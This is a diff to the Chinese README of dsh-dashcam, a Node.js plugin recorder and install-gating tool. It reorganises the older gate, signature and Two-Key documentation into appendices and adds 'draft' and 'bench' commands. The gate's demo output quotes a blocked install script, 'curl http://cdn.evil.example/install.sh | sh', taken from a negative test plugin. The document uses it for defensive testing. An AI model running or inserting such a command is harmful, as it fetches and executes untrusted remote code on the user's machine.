@@ -41,7 +41,11 @@
 
 零第三方依赖，Node.js >= 20（CommonJS）。
 
-## 演示：恶意插件在安装期被拦下
+## 附录：dashcam 之前的机制（门禁 / 签名 / Two-Key）
+
+下面的附录 A–F 是 1.11.0 转向「记录」之前积累的执行机制。**它们仍然可用、仍在维护（只修 bug），但不再投入新功能。** 产品是行车记录仪——本节之前的内容才是主菜。只有当你想在记录之上加判定（`config.requests` / `config.grants`、Two-Key）或使用安装门禁流水线时才需要读附录；下面的演示照旧可跑。
+
+### 附录 A · 演示：恶意插件在安装期被拦下
 
 对仓库自带[反例包](examples/negative-plugin)跑安装门禁的真实输出——manifest 里 patch 路径越出插件目录、安装脚本把远程脚本直接管道进 `sh`（字段有省略）：
 
@@ -51,19 +55,41 @@ $ node bin/dsh-dashcam.js gates examples/negative-plugin --skip-signature
   "ok": false,
   "blocked": true,
   "plugin": "com.example.leaky",
-  "securityLabels": ["Untrusted"],
+  "securityLabels": ["SignatureSkipped"],
   ...
   "formatted": [
     "[structure] manifest.json field=patches[0].path — patch 路径越出插件目录",
     "[structure] manifest.json field=scripts.install — 安装脚本不在白名单：curl http://cdn.evil.example/install.sh | sh"
   ],
   "labelLines": [
-    "[Untrusted] — 调用方跳过验签，签名状态未知"
+    "[SignatureSkipped] — 调用方跳过验签，签名状态未知"
   ]
 }
 ```
 
 流水线 fail-fast：`structure` 门直接拦下安装，签名/安全/契约各阶段都不会再跑；每条报错都精确到字段与文件。
+
+### 附录 B · 核心模型
+
+```
+manifest 声明 ─┐
+               ├─ Two-Key（交集）─→ 守卫链 ─→ 放行 / 拒绝 ─→ Ledger（哈希链）
+宿主授予   ─────┘                      ↑
+                                  One-Seal / 黑名单 / 完整性
+```
+
+- **默认 deny-all**：宿主 `grants` 默认为空。
+- **非侵入式防护**：`policy.enforcement.mode` 默认 `advisory`——门禁先装，再输出安全画像标签
+  （`Untrusted` / `SignatureSkipped` / `Quarantined` / `ReviewRequired` / `Broken` / `Verified`）；只有恶意脚本与应急黑名单才阻断安装。
+  `mode: 'required'` 或企业通道恢复“拒绝安装”语义。
+- **legacy 默认配置**：没有 `dashcam` 字段不拒绝解析，自动生成 `{ level: 'legacy', quarantine: true }`；
+  没有声明就没有能力（Two-Key 交集为空），企业通道仍然拒绝。
+- **能力面**：`fs.*`、`net.outbound`、`net.listen`、`proc.spawn`、`proc.signal`、`env.*`、`cred.*`。凭证路径与环境变量自动升级为 `cred.*`。
+- **scope**：路径 glob、`host:port`、环境变量前缀通配、命令基名、端口子集、signal 目标白名单。完整语义见 [docs/SPEC.md](docs/SPEC.md)。
+- **审计**：JSONL 追加 + SHA-256 哈希链，字段固定，可逐行离线重算；
+  `intercepted=true` 单独记录“实际拦截的未声明 API 调用”，`Ledger.interceptions()` 可直接取出。
+- **ingress 观测**：`capability='llm.ingress'` 的请求/入站/异常记录与判定记录同链、同验签，
+  但 `metrics` 单独计数，不稀释允许率与拦截率；`ingress --find` 只搜已采样的 head（未采样不覆盖）。
 
 ## 1.11.0 改名：dsh-covenant → dsh-dashcam
 
@@ -125,31 +151,13 @@ node bin/dsh-dashcam.js rotate ~/.dsh/dsh-dashcam/ledger.jsonl --max-bytes 52428
 node bin/dsh-dashcam.js redact ~/.dsh/dsh-dashcam/ledger.jsonl --out share.jsonl      # 分享前把 home 折叠成 $HOME（保留归属字段）
 node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --session <id>
 node bin/dsh-dashcam.js ingress ~/.dsh/dsh-dashcam/ledger.jsonl --find "状态栏"
+node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl            # 从观测行为反推 requests 草案（需人工收敛）
+node bin/dsh-dashcam.js bench --n 10000                                 # 「被记录」的每次调用开销（guarded vs 裸 fs）
 ```
 
 > **分享账本前**：记录里含绝对路径与命令元数据。先跑 `redact`——home 前缀折叠成 `$HOME`，重算成一条全新可验的链；`plugin` / `pluginVersion` / `profiled` 原样保留——谁干的留下，你住哪抹掉。
 
-## 核心模型
-
-```
-manifest 声明 ─┐
-               ├─ Two-Key（交集）─→ 守卫链 ─→ 放行 / 拒绝 ─→ Ledger（哈希链）
-宿主授予   ─────┘                      ↑
-                                  One-Seal / 黑名单 / 完整性
-```
-
-- **默认 deny-all**：宿主 `grants` 默认为空。
-- **非侵入式防护**：`policy.enforcement.mode` 默认 `advisory`——门禁先装，再输出安全画像标签
-  （`Untrusted` / `Quarantined` / `ReviewRequired` / `Broken` / `Verified`）；只有恶意脚本与应急黑名单才阻断安装。
-  `mode: 'required'` 或企业通道恢复“拒绝安装”语义。
-- **legacy 默认配置**：没有 `dashcam` 字段不拒绝解析，自动生成 `{ level: 'legacy', quarantine: true }`；
-  没有声明就没有能力（Two-Key 交集为空），企业通道仍然拒绝。
-- **能力面**：`fs.*`、`net.outbound`、`net.listen`、`proc.spawn`、`proc.signal`、`env.*`、`cred.*`。凭证路径与环境变量自动升级为 `cred.*`。
-- **scope**：路径 glob、`host:port`、环境变量前缀通配、命令基名、端口子集、signal 目标白名单。完整语义见 [docs/SPEC.md](docs/SPEC.md)。
-- **审计**：JSONL 追加 + SHA-256 哈希链，字段固定，可逐行离线重算；
-  `intercepted=true` 单独记录“实际拦截的未声明 API 调用”，`Ledger.interceptions()` 可直接取出。
-- **ingress 观测**：`capability='llm.ingress'` 的请求/入站/异常记录与判定记录同链、同验签，
-  但 `metrics` 单独计数，不稀释允许率与拦截率；`ingress --find` 只搜已采样的 head（未采样不覆盖）。
+> **被记录的代价**：每次改完 bridge 跑一遍 `node bin/dsh-dashcam.js bench`。Windows 开发机实测（1.12.x），一次被记录的 `fs` 调用约多花 **1.1–1.5 ms**（守卫判定 + 逐条落账，同步账本写入占大头；裸 `fs` 为 0.04–0.5 ms）。数字与机器相关——请自己测，别抄。
 
 ## 目录
 
@@ -232,6 +240,10 @@ node bin/dsh-dashcam.js autopsy ./plugin --profile profile.json --patch patch.js
 node bin/dsh-dashcam.js metrics .dsh-ledger.jsonl --events events.json
 node bin/dsh-dashcam.js blacklist blacklist.json add com.example.evil 紧急下架
 node bin/dsh-dashcam.js rollout metrics.json
+
+# 从观测到契约：反推声明草案，再量代价
+node bin/dsh-dashcam.js draft ~/.dsh/dsh-dashcam/ledger.jsonl --manifest ./plugin   # 已声明的能力不再重复建议
+node bin/dsh-dashcam.js bench --n 10000
 ```
 
 失败报告精确到字段与文件行，例如：
@@ -241,7 +253,7 @@ node bin/dsh-dashcam.js rollout metrics.json
 [safety] index.js:14 field=dashcam.capabilities.requests — 代码使用 net.outbound，但 manifest 未声明
 ```
 
-## 示例包
+### 附录 C · 示例包
 
 - [examples/compliant-plugin](examples/compliant-plugin)：声明 fs/net/env，Charter 完整，可过全部门禁（配合 `examples/demo-policy.json` 的授予集）。
 - [examples/negative-plugin](examples/negative-plugin)：越界 patch、空 reason、非白名单安装脚本、未声明 `proc.spawn` / `cred.read` / `net.outbound`。用于验证契约层与门禁。
@@ -279,7 +291,7 @@ const report = bridge.coverage();
   `policy.enforcement.observeLoadWindow = false` 关闭（装载期越界直接拒绝装载）；`strictPatch = true`
   时窗口强制关闭且不可用配置重开；装载结束若有越界放行，会打 warning 告警（`stats.observed > 0`）。
 
-## 能力句柄：把补丁换成小世界（1.2.0 实验）
+### 附录 D · 能力句柄：把补丁换成小世界（1.2.0 实验）
 
 Bridge 只能做到「我想到的都包了」。想真正做到「没声明就做不到」，得反过来：不给插件全局 API，只给它一个受限对象。
 
@@ -299,7 +311,7 @@ handles.fs.coverage();                               // { closed: true, methods:
 
 现在只覆盖 `fs`。`net` / `proc` 按同一模式扩展：一个方法一次 `guard.enforce`。
 
-## 能力注入：让 require('fs') 可选返回句柄（1.5.0）
+### 附录 E · 能力注入：让 require('fs') 可选返回句柄（1.5.0）
 
 句柄再好，插件不用也没用。但封闭面天生不完整——`openSync`、`fs.promises.open`、`watch`、`globSync`
 在句柄里都没有，默认开它会直接把存量插件打成 `TypeError`。所以 `LocalHost` 与 `activate()` 都默认
@@ -323,7 +335,7 @@ fs.readSync(fd, ...);            // TypeError: 这个方法不存在
   `sandbox.mode` 只决定 `require('fs')` 是否被重定向。
 - 默认值必须保可用性：不开 `handles`，存量插件零改动即可运行。
 
-## 为什么是非侵入式
+### 附录 F · 为什么是非侵入式
 
 安装门禁的职责不是“替用户决定装不装”，而是**把风险讲清楚，并把执行点留在宿主**：
 
